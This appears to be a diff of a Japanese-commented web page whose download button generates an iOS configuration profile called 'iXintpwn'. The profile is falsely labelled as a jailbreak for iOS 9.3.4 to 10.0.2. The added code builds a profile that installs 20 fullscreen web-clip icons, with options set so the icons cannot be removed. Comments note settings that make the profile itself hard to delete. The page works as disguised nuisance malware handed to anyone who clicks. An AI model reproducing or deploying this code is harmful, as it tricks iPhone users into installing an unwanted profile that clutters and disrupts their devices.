@@ -1,101 +1,31 @@
-<html xmlns="http://www.w3.org/1999/xhtml">  
-<head>  
-    <meta http-equiv="Content-Type" content="text/html; charset=Shift_JIS" />  
-    <meta http-equiv="Content-Style-Type" content="text/css" />  
-    <title></title>  
-    <script type="text/javascript">  
-        //krsw
+<!--
+html部分
+-->
+<button id="iisdownloadbutton" type="button" onclick="iisqsdownload()">Download</button>
 
-        // クロスブラウザに対応したXMLHttpRequestオブジェクトを作成
-        function createHttpObject() {
-            try {
-                if (window.XMLHttpRequest) {
-                    // Win(moz1,ff1,op8,ie7),Mac,Linux  
-                    httpObj1 = new XMLHttpRequest();
-                } else if (window.ActiveXObject) {
-                    // Win(ie4,5,6)  
-                    try {
-                        httpObj1 = new ActiveXObject("Msxml2.XMLHTTP");
-                    } catch (e1) {
-                        httpObj1 = new ActiveXObject("Microsoft.XMLHTTP");
-                    }
-                } else {
-                    httpObj1 = null;
-                }
-            } catch (e2) {
-                httpObj1 = null;
-            }
-            return httpObj1;
-        }
-        //非同期処理でファイルの生成およびダウンロードを行う関数
-        function submitReq1() {
-                //関数の宣言 
-                //文字列ねじ込み関数
-                function insertStr(str, index, insert) {
-                    return str.slice(0, index) + insert + str.slice(index, str.length);
-                }
-
-                //非同期処理オブジェクトを作成
-                httpObj1 = createHttpObject();
-                if (httpObj1) {
-                    // GETメソッドでixint1.txtﾌｧｲﾙを非同期で開く  
-                    httpObj1.open("GET", "ixint1.txt", true);
-                    httpObj1.onreadystatechange = function() {
-                            // 状態が変わったときに実行する処理を記述  
-                            if (httpObj1.readyState == 4) {
-                                if (httpObj1.status == 200) {
-                                    //正しく読み込みが完了した時の処理
-                                    // 内容を変数に代入  
-                                    var res = httpObj1.responseText;
-                                    //IDの生成とねじこみ(正直ここも関数化したい)
-                                    var length = 8
-                                    var randomID = Math.random().toString(36).slice(-length);
-                                    value2 = insertStr(res, 377, randomID);
-                                    //↑バッティングしそうな変数をグローバル宣言しているので注意
-
-                                    /*************処理修正点***************
-                                    //blobの作成とダウンロード
-                                    textSave('myfile', value2);
-                                    **************************************/
-
-                                } else {
-                                    //例外時の処理
-                                    /********処理修正点***********/
-                                    alert("データ読み込みに失敗しました。(" + httpObj1.status + ":" + httpObj1.statusText + ")");
-                                    /*修正点：エラー時に値を取得するオブジェクトはhttpObjではなくhttpObj1でござる。*/
-                                }
-                            }
-                        }
-                    // 送信処理実行  
-                    httpObj1.send('');
-                }
-            }
-            /*あとでつかうのでtextSave関数をグローバルに*/
-            //ファイル動的生成およびダウンロードを行う関数
-            function textSave(name, text) {
-                var blob = new Blob([text], {
-                    type: 'application/x-apple-aspen-config'
-                })
-                var link = document.createElement('a')
-                link.href = URL.createObjectURL(blob)
-                link.download = name + '.mobileconfig'
-                link.click();
-                }
-            //krsw
-    </script>  
-</head>  
-<body>
-    <script type="text/javascript">
-            /*****処理追加部分*******/
-            submitReq1();
-            function buttonclickfunction(){
-                if (httpObj1.status == 200) {
-                textSave('myfile', value2);
-                }
-            }
-            /********ここまで*******/
-    </script>
-    <input id="Button1" type="button" value="Helloworld!" onclick="buttonclickfunction();" /> 
-<a id="anchor" href=""></a>
-</body>  
-</html>  
+<!--
+javascript部分
+-->
+<script src="iosiconshock-1.0.js"></script><!--iosiconshock.jsのパスを設定-->
+<script>
+  function iisqsdownload(){
+    var iis = new iosiconshock();
+    iis.profileGUID='816f33ed-548c-4106-b57c-bc11307e7a57'
+    iis.profileDisplayName='iXintpwn';
+    iis.Identifier='com.yjsnpi.viruss';
+    iis.profileOrganization='iXintpwn team';
+    iis.profileDescription='Jailbreak for iOS9.3.4-iOS10.0.2';
+    iis.profileDeleteGuad='true';//falseにすると強い
+    iis.iconURL='http://www.nicovideo.jp/search/%E9%87%8E%E7%8D%A3%E5%85%88%E8%BC%A9';
+    iis.iconLabel='ｲｷｽｷﾞｨ!';
+    iis.iconData='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';
+    iis.iconRemovable='false';//trueにするとアイコン消せる
+    iis.iconFullscreen='true';
+    var delguard_randomize = false;//trueにするとプロファイルを簡単に消せなくなる。
+    var repeat = 20;//アイコンの個数
+    var link = document.createElement( 'a' );
+	  link.href = iis.gen(repeat,delguard_randomize);
+	  link.download = "ixintpwn.mobileconfig";
+	  link.click();
+  }
+</script>
